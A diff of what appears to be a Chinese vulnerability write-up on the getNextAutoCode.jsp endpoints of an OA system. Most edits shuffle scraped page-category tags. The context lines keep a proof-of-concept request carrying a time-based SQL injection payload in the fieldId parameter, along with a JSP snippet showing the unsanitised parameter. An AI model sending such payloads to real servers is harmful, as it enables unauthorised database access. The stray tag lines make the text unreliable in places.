@@ -25,7 +25,7 @@ asset_dir: embedded-base64
 > platform/custom/custom\_form/run/checkform/getNextAutoCode.jsp  
 > platform/custom/ezform/run/getNextAutoCode.jsp
 >
-> 广告与营销
+> 营销
 
 ```
 GET /defaultroot/platform/custom/custom_form/run/checkform/getNextAutoCode.jsp;.js?fieldId=1+WAITFOR+DELAY+'00:00:03'--&fieldName=2&orgName=4&tableId=3 HTTP/1.1
@@ -36,9 +36,9 @@ Host: 192.168.22.187:7001
 
 深入探索
 
-防病毒程序与恶意软件
+广告与营销
 
-商务软件和生产力软件
+计算机服务器
 
 计算机安全
 
@@ -67,14 +67,6 @@ String ret = ac.getAutoCode(fieldId, fieldName, tableId, orgName, null);
 out.print(ret);
 %>
 ```
-
-深入探索
-
-广告与营销
-
-软件
-
-客户关系管理
 
 `getAutoCode` 函数如下
 
